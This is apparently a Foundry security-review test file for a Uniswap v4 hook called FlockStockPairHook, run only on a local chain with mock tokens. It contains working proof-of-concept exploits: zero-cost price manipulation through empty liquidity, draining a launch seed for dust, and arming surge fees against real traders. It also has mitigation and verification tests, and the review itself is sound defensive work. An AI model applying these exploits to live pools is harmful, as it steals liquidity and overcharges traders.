// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Security-review PoCs for FlockStockPairHook (local PoolManager, mock tokens), written against the revision with
// owner-gated `initializePool` and time-based launch decay.
// forge test --match-path test/review/HookReview.t.sol -vv

import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";

import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {LPFeeLibrary} from "@uniswap/v4-core/src/libraries/LPFeeLibrary.sol";
import {LiquidityAmounts} from "@uniswap/v4-core/test/utils/LiquidityAmounts.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";
import {Constants} from "@uniswap/v4-core/test/utils/Constants.sol";
import {PathKey} from "hookmate/interfaces/router/PathKey.sol";

import {EasyPosm} from "../utils/libraries/EasyPosm.sol";
import {BaseTest} from "../utils/BaseTest.sol";
import {FlockStockPairHook} from "../../src/FlockStockPairHook.sol";
import {BaseHook} from "@openzeppelin/uniswap-hooks/src/base/BaseHook.sol";

/// @dev Minimal unlock callback: performs one swap and deliberately settles NOTHING. `unlock` therefore only
///      succeeds when the swap produced a zero delta on both currencies, i.e. when the price was moved for free.
contract RawSwapper is IUnlockCallback {
    IPoolManager immutable pm;

    constructor(IPoolManager _pm) {
        pm = _pm;
    }

    function swapNoSettle(PoolKey memory key, bool zeroForOne, int256 amountSpecified, uint160 limit)
        external
        returns (BalanceDelta d)
    {
        d = abi.decode(pm.unlock(abi.encode(key, zeroForOne, amountSpecified, limit)), (BalanceDelta));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "not pm");
        (PoolKey memory key, bool z, int256 a, uint160 l) = abi.decode(data, (PoolKey, bool, int256, uint160));
        BalanceDelta d = pm.swap(key, SwapParams({zeroForOne: z, amountSpecified: a, sqrtPriceLimitX96: l}), "");
        return abi.encode(d);
    }
}

contract HookReviewTest is BaseTest {
    using EasyPosm for IPositionManager;
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    uint160 constant FLAGS = uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG);
    bytes32 constant SWAP_SIG = keccak256("StockPairSwap(bytes32,address,address,bool,int128,int128,int256,uint24,int24)");
    uint256 constant WED_2026_09_02 = 1788350400;
    uint256 constant INIT_BLOCK = 1_000_000;
    uint256 constant SEED = 2_600_000e18;

    MockERC20 flock;
    MockERC20 stock;
    Currency c0;
    Currency c1;
    bool flockIs0;

    FlockStockPairHook hook;
    RawSwapper raw;
    address owner = makeAddr("flockSafe");
    address trader = makeAddr("trader");
    address attacker = makeAddr("attacker");

    PoolKey key;
    PoolId poolId;

    // Script defaults, but with the (optional) surge fee switched ON so its interaction with free swaps is visible.
    FlockStockPairHook.FeeConfig cfg = FlockStockPairHook.FeeConfig({
        baseFee: 3_000,
        minFee: 2_500,
        maxFee: 10_000,
        launchFee: 10_000,
        weekendFee: 6_000,
        surgeFee: 8_000,
        surgeTickThreshold: 500,
        surgeWindow: 300,
        launchSeconds: 1800
    });

    function setUp() public {
        deployArtifactsAndLabel();
        vm.warp(WED_2026_09_02);
        vm.roll(INIT_BLOCK);

        flock = deployToken();
        stock = deployToken();
        vm.label(address(flock), "FLOCK");
        vm.label(address(stock), "STOCK");
        flockIs0 = address(flock) < address(stock);
        (c0, c1) = flockIs0
            ? (Currency.wrap(address(flock)), Currency.wrap(address(stock)))
            : (Currency.wrap(address(stock)), Currency.wrap(address(flock)));

        address hookAddr = address(FLAGS ^ (0x4444 << 144));
        deployCodeTo("FlockStockPairHook.sol:FlockStockPairHook", abi.encode(poolManager, address(flock), owner), hookAddr);
        hook = FlockStockPairHook(hookAddr);
        raw = new RawSwapper(poolManager);

        key = PoolKey(c0, c1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook));
        poolId = key.toId();
        vm.startPrank(owner);
        hook.registerPool(key, cfg);
        hook.initializePool(key, Constants.SQRT_PRICE_1_1); // tick 0
        vm.stopPrank();

        // Launch-style single-sided FLOCK band ending exactly at spot (same construction as 02_InitializeAndSeed).
        (int24 lo, int24 hi) = _bandAt(0, 60, 60);
        _mintFlockBand(key, lo, hi, Constants.SQRT_PRICE_1_1);
        assertEq(poolManager.getLiquidity(poolId), 0, "band must start out of range");

        _fund(trader, 10_000_000e18);
    }

    // ------------------------------------------------------------------ helpers

    function _fund(address who, uint256 amt) internal {
        flock.mint(who, amt);
        stock.mint(who, amt);
        vm.startPrank(who, who);
        flock.approve(address(swapRouter), type(uint256).max);
        stock.approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();
    }

    function _trunc(int24 tick, int24 sp) internal pure returns (int24 t) {
        t = (tick / sp) * sp;
        if (tick < 0 && t != tick) t -= sp;
    }

    /// @dev Exactly the band 02_InitializeAndSeed builds around `tick` (FLOCK=c1 -> below spot; FLOCK=c0 -> above).
    function _bandAt(int24 tick, int24 sp, int24 spacings) internal view returns (int24 lo, int24 hi) {
        if (!flockIs0) {
            hi = _trunc(tick, sp);
            lo = hi - spacings * sp;
        } else {
            lo = _trunc(tick, sp);
            if (lo < tick) lo += sp;
            hi = lo + spacings * sp;
        }
    }

    function _mintFlockBand(PoolKey memory k, int24 lo, int24 hi, uint160 sqrtPrice) internal returns (uint256 id) {
        uint128 liq = LiquidityAmounts.getLiquidityForAmounts(
            sqrtPrice, TickMath.getSqrtPriceAtTick(lo), TickMath.getSqrtPriceAtTick(hi), flockIs0 ? SEED : 0, flockIs0 ? 0 : SEED
        );
        (id,) = positionManager.mint(
            k, lo, hi, liq, flockIs0 ? SEED + SEED / 1000 : 1, flockIs0 ? 1 : SEED + SEED / 1000, address(this), block.timestamp, ""
        );
    }

    function _buyFlock(PoolKey memory k, address who, uint256 amountIn) internal returns (BalanceDelta d) {
        vm.startPrank(who, who);
        d = swapRouter.swapExactTokensForTokens({
            amountIn: amountIn,
            amountOutMin: 0,
            zeroForOne: !flockIs0,
            poolKey: k,
            hookData: "",
            receiver: who,
            deadline: block.timestamp + 1
        });
        vm.stopPrank();
    }

    function _flockDelta(BalanceDelta d) internal view returns (int256) {
        return flockIs0 ? int256(d.amount0()) : int256(d.amount1());
    }

    function _stockDelta(BalanceDelta d) internal view returns (int256) {
        return flockIs0 ? int256(d.amount1()) : int256(d.amount0());
    }

    function _tick(PoolId id) internal view returns (int24 t) {
        (, t,,) = poolManager.getSlot0(id);
    }

    /// @dev Free swap that parks the pool price exactly at `target` (only possible through empty liquidity).
    function _freeMoveTo(PoolKey memory k, int24 target) internal returns (BalanceDelta d) {
        int24 cur = _tick(k.toId());
        bool zeroForOne = target < cur;
        vm.prank(attacker, attacker);
        d = raw.swapNoSettle(k, zeroForOne, -1e18, TickMath.getSqrtPriceAtTick(target));
    }

    struct Ev {
        PoolId id;
        address trader;
        uint24 fee;
        int256 flockDelta;
    }

    function _swapEvents() internal returns (Ev[] memory evs) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        uint256 n;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == address(hook) && logs[i].topics[0] == SWAP_SIG) n++;
        }
        evs = new Ev[](n);
        uint256 j;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == address(hook) && logs[i].topics[0] == SWAP_SIG) {
                (,,, int256 fd, uint24 fee,) = abi.decode(logs[i].data, (bool, int128, int128, int256, uint24, int24));
                evs[j++] = Ev(PoolId.wrap(logs[i].topics[1]), address(uint160(uint256(logs[i].topics[2]))), fee, fd);
            }
        }
    }

    // ------------------------------------------------------------------ PoC 1: init -> seed gap (Safe flow)

    /// Owner initialises through the hook (Safe tx). Before the seed lands, an attacker with NO tokens parks the
    /// spot price on the "FLOCK is worthless" side with a zero-delta swap. 02_InitializeAndSeed in seed-only mode
    /// reads the LIVE tick and builds the FLOCK band there, so the whole seed is sold for dust.
    function test_poc_initSeedGap_freePriceMoveThenSeedAtLiveTick_drainsSeedForDust() public {
        PoolKey memory k2 = PoolKey(c0, c1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 120, IHooks(hook));
        PoolId id2 = k2.toId();
        vm.startPrank(owner);
        hook.registerPool(k2, cfg);
        hook.initializePool(k2, Constants.SQRT_PRICE_1_1); // Safe tx #1: pool live at the intended tick 0, no liquidity
        vm.stopPrank();
        assertEq(poolManager.getLiquidity(id2), 0);

        // Attacker (zero balances) moves the price ~e^40x against FLOCK for the cost of gas only.
        int24 target = flockIs0 ? int24(-400_000) : int24(400_000);
        assertEq(flock.balanceOf(attacker), 0);
        assertEq(stock.balanceOf(attacker), 0);
        BalanceDelta d = _freeMoveTo(k2, target);
        assertEq(d.amount0(), 0);
        assertEq(d.amount1(), 0);
        assertEq(_tick(id2), target, "spot parked at the attacker's tick");

        // Operator re-runs 02_InitializeAndSeed: `alreadyInitialized` -> band anchored at the live tick.
        int24 live = _tick(id2);
        (int24 lo, int24 hi) = _bandAt(live, 120, 60);
        uint256 flockBefore = flock.balanceOf(address(this));
        _mintFlockBand(k2, lo, hi, TickMath.getSqrtPriceAtTick(live)); // succeeds: FLOCK-only band, 0 stock needed
        assertApproxEqRel(flockBefore - flock.balanceOf(address(this)), SEED, 0.001e18, "2.6M FLOCK seeded");

        // Attacker buys the entire band with 1e-6 stock tokens.
        _fund(attacker, 1e12);
        BalanceDelta buy = _buyFlock(k2, attacker, 1e12);
        uint256 flockOut = uint256(_flockDelta(buy));
        uint256 stockPaid = uint256(-_stockDelta(buy));
        assertGt(flockOut, SEED * 95 / 100, "attacker took >95% of the seed");
        assertLe(stockPaid, 1e12, "for at most 1e-6 stock tokens");
        assertEq(flock.balanceOf(attacker), 1e12 + flockOut); // 1e12 FLOCK was minted to the attacker by _fund
        console2.log("seed FLOCK drained by attacker (wei):", flockOut);
        console2.log("stock tokens paid by attacker (wei):", stockPaid);
    }

    /// Operational mitigation available today: pause before initialising, seed, then unpause. While paused every
    /// swap (including a zero-delta price move) reverts, liquidity operations are unaffected.
    function test_mitigation_initPausedBlocksFreeMoveUntilSeeded() public {
        PoolKey memory k3 = PoolKey(c0, c1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 30, IHooks(hook));
        PoolId id3 = k3.toId();
        vm.startPrank(owner);
        hook.registerPool(k3, cfg);
        hook.setPaused(id3, true);
        hook.initializePool(k3, Constants.SQRT_PRICE_1_1);
        vm.stopPrank();

        int24 target = flockIs0 ? int24(-400_000) : int24(400_000);
        vm.prank(attacker, attacker);
        vm.expectRevert(); // PoolPaused, wrapped by the PoolManager
        raw.swapNoSettle(k3, target < 0, -1e18, TickMath.getSqrtPriceAtTick(target));
        assertEq(_tick(id3), 0);

        (int24 lo, int24 hi) = _bandAt(0, 30, 60);
        _mintFlockBand(k3, lo, hi, Constants.SQRT_PRICE_1_1); // liquidity ops work while paused
        vm.prank(owner);
        hook.setPaused(id3, false);
        BalanceDelta buy = _buyFlock(k3, trader, 1_000e18);
        assertGt(_flockDelta(buy), 0);
    }

    // ------------------------------------------------------------------ PoC 2: free tick moves after launch

    /// The launched pool has no liquidity above spot, so anyone can move the spot price there for free; the hook
    /// counts the no-op as a swap and a unique trader, and (if enabled) arms the surge fee for real traders.
    function test_poc_freeTickMove_pollutesAccountingAndArmsSurgeFee() public {
        vm.warp(block.timestamp + 3600); // launch decay over: fee otherwise due is baseFee 0.30%
        assertEq(hook.previewFee(poolId), 3_000);
        int24 tickBefore = _tick(poolId);

        int24 extreme = flockIs0 ? TickMath.MIN_TICK + 60 : TickMath.MAX_TICK - 60;
        BalanceDelta d = _freeMoveTo(key, extreme);
        assertEq(d.amount0(), 0);
        assertEq(d.amount1(), 0);
        assertEq(flock.balanceOf(attacker), 0);
        assertEq(stock.balanceOf(attacker), 0);
        assertEq(_tick(poolId), extreme, "spot at the far end of the curve");

        FlockStockPairHook.PoolState memory st = hook.poolState(poolId);
        assertEq(st.swapCount, 1, "no-op swap counted");
        assertEq(st.uniqueTraders, 1, "phantom unique trader");
        assertEq(hook.firstTradeAt(poolId, attacker), uint40(block.timestamp));
        assertEq(st.windowStartTick, tickBefore);
        assertEq(st.lastTick, extreme);
        assertEq(hook.previewFee(poolId), 8_000, "surge armed by a free swap");

        // Repeatable at will once the window lapses: bounce back to just outside the band edge, still through
        // empty liquidity, still free (the empty side stays empty until somebody adds liquidity there).
        vm.warp(block.timestamp + 301);
        assertEq(hook.previewFee(poolId), 3_000);
        int24 nearEdge = flockIs0 ? int24(-60) : int24(60);
        BalanceDelta d2 = _freeMoveTo(key, nearEdge);
        assertEq(d2.amount0(), 0);
        assertEq(d2.amount1(), 0);
        assertEq(hook.previewFee(poolId), 8_000, "re-armed");
        assertEq(hook.poolState(poolId).swapCount, 2);

        // a real buyer arriving now pays the surge fee (0.80%) instead of base (0.30%) - and until the spot was
        // bounced back, any quote/UI mid-price was computed from a spot ~e^88 away from where trades execute.
        vm.recordLogs();
        BalanceDelta buy = _buyFlock(key, trader, 1_000e18);
        assertGt(_flockDelta(buy), 0);
        Ev[] memory evs = _swapEvents();
        assertEq(evs.length, 1);
        assertEq(evs[0].fee, 8_000, "real trader charged the surge fee armed by free swaps");
        assertEq(evs[0].trader, trader);
        assertEq(hook.poolState(poolId).swapCount, 3);
    }

    /// Same no-op swap through the stock hookmate router, from an address that holds nothing.
    function test_poc_freeTickMove_viaRouterWithZeroBalance() public {
        vm.startPrank(attacker, attacker);
        swapRouter.swapExactTokensForTokens({
            amountIn: 1e18,
            amountOutMin: 0,
            zeroForOne: flockIs0, // into the empty side
            poolKey: key,
            hookData: "",
            receiver: attacker,
            deadline: block.timestamp + 1
        });
        vm.stopPrank();
        assertEq(hook.poolState(poolId).swapCount, 1);
        assertEq(hook.poolState(poolId).uniqueTraders, 1);
        assertTrue(_tick(poolId) != 0);
    }

    // ------------------------------------------------------------------ Init gate verification (new revision)

    function test_initGate_directAndPositionManagerPathsCannotInitialise() public {
        PoolKey memory k2 = PoolKey(c0, c1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 120, IHooks(hook));
        vm.prank(owner);
        hook.registerPool(k2, cfg);

        vm.prank(attacker, attacker);
        vm.expectRevert(); // InitializerNotHook wrapped in HookCallFailed
        poolManager.initialize(k2, TickMath.getSqrtPriceAtTick(200_000));

        // PositionManager.initializePool swallows the revert; the pool stays uninitialised, so a mint reverts.
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(positionManager.initializePool.selector, k2, TickMath.getSqrtPriceAtTick(200_000));
        positionManager.multicall(calls);
        assertFalse(hook.poolState(k2.toId()).initialized);
        (uint160 sqrt,,,) = poolManager.getSlot0(k2.toId());
        assertEq(sqrt, 0, "pool not initialised through the PositionManager path");

        // Unregistered key with this hook cannot be initialised by anyone either (no look-alike pools).
        PoolKey memory k4 = PoolKey(c0, c1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 10, IHooks(hook));
        vm.expectRevert();
        poolManager.initialize(k4, Constants.SQRT_PRICE_1_1);
        // ... and a static-fee key carrying the hook address is rejected too.
        PoolKey memory k5 = PoolKey(c0, c1, 3000, 60, IHooks(hook));
        vm.expectRevert();
        poolManager.initialize(k5, Constants.SQRT_PRICE_1_1);
    }

    // ------------------------------------------------------------------ Transient state across a multi-hop

    /// Two registered pools swapped in ONE unlock (stock -> FLOCK -> stockB). Each afterSwap must see its own
    /// beforeSwap's fee / tick. (Expected to pass: documents that the shared transient slots are safe.)
    function test_multiHopThroughTwoRegisteredPools_transientStateIsPerSwap() public {
        MockERC20 stockB = deployToken();
        vm.label(address(stockB), "STOCK_B");
        bool flockIs0B = address(flock) < address(stockB);
        (Currency b0, Currency b1) = flockIs0B
            ? (Currency.wrap(address(flock)), Currency.wrap(address(stockB)))
            : (Currency.wrap(address(stockB)), Currency.wrap(address(flock)));
        PoolKey memory kB = PoolKey(b0, b1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook));
        PoolId idB = kB.toId();
        FlockStockPairHook.FeeConfig memory cfgB = FlockStockPairHook.FeeConfig({
            baseFee: 20_000,
            minFee: 5_000,
            maxFee: 50_000,
            launchFee: 0,
            weekendFee: 0,
            surgeFee: 0,
            surgeTickThreshold: 0,
            surgeWindow: 0,
            launchSeconds: 0
        });
        int24 tickB = 6000;
        uint160 sqrtB = TickMath.getSqrtPriceAtTick(tickB);
        vm.startPrank(owner);
        hook.registerPool(kB, cfgB);
        hook.initializePool(kB, sqrtB);
        vm.stopPrank();
        {
            int24 lo = TickMath.minUsableTick(60);
            int24 hi = TickMath.maxUsableTick(60);
            uint128 liq = 1_000_000e18;
            (uint256 a0, uint256 a1) = LiquidityAmounts.getAmountsForLiquidity(
                sqrtB, TickMath.getSqrtPriceAtTick(lo), TickMath.getSqrtPriceAtTick(hi), liq
            );
            positionManager.mint(kB, lo, hi, liq, a0 + 1, a1 + 1, address(this), block.timestamp, "");
        }

        vm.warp(block.timestamp + 3600); // pool A: base 0.30%; pool B: base 2%
        assertEq(hook.previewFee(poolId), 3_000);
        assertEq(hook.previewFee(idB), 20_000);

        PathKey[] memory path = new PathKey[](2);
        path[0] = PathKey(Currency.wrap(address(flock)), LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook), "");
        path[1] = PathKey(Currency.wrap(address(stockB)), LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook), "");

        vm.recordLogs();
        vm.startPrank(trader, trader);
        swapRouter.swapExactTokensForTokens(100e18, 0, Currency.wrap(address(stock)), path, trader, block.timestamp + 1);
        vm.stopPrank();

        Ev[] memory evs = _swapEvents();
        assertEq(evs.length, 2, "two hook swaps in one unlock");
        assertEq(PoolId.unwrap(evs[0].id), PoolId.unwrap(poolId));
        assertEq(evs[0].fee, 3_000, "pool A fee from its own beforeSwap");
        assertGt(evs[0].flockDelta, 0, "bought FLOCK in A");
        assertEq(PoolId.unwrap(evs[1].id), PoolId.unwrap(idB));
        assertEq(evs[1].fee, 20_000, "pool B fee from its own beforeSwap");
        assertLt(evs[1].flockDelta, 0, "sold FLOCK in B");
        assertEq(evs[0].trader, trader);
        assertEq(evs[1].trader, trader);
        assertEq(hook.poolState(poolId).windowStartTick, 0, "A anchored at its own pre-swap tick");
        assertEq(hook.poolState(idB).windowStartTick, tickB, "B anchored at its own pre-swap tick");
        assertGt(stockB.balanceOf(trader), 0);
    }

    // ------------------------------------------------------------------ Info-level checks

    function test_info_storedLpFeeStaysAtLaunchFeeForever() public {
        vm.warp(block.timestamp + 30 days);
        assertEq(hook.previewFee(poolId), 3_000);
        (,,, uint24 lpFee) = poolManager.getSlot0(poolId);
        assertEq(lpFee, 10_000, "slot0.lpFee still shows the 1% launch fee");
    }

    function test_info_hookEntryPointsRejectNonPoolManager() public {
        vm.expectRevert(BaseHook.NotPoolManager.selector);
        hook.beforeSwap(address(this), key, SwapParams(true, -1, 0), "");
        vm.expectRevert(BaseHook.NotPoolManager.selector);
        hook.afterSwap(address(this), key, SwapParams(true, -1, 0), BalanceDelta.wrap(0), "");
        vm.expectRevert(BaseHook.NotPoolManager.selector);
        hook.beforeInitialize(address(this), key, Constants.SQRT_PRICE_1_1);
    }

    function test_info_renounceRevertsWithMisleadingSelector() public {
        vm.prank(owner);
        vm.expectRevert(FlockStockPairHook.InvalidFeeConfig.selector);
        hook.renounceOwnership();
    }
}
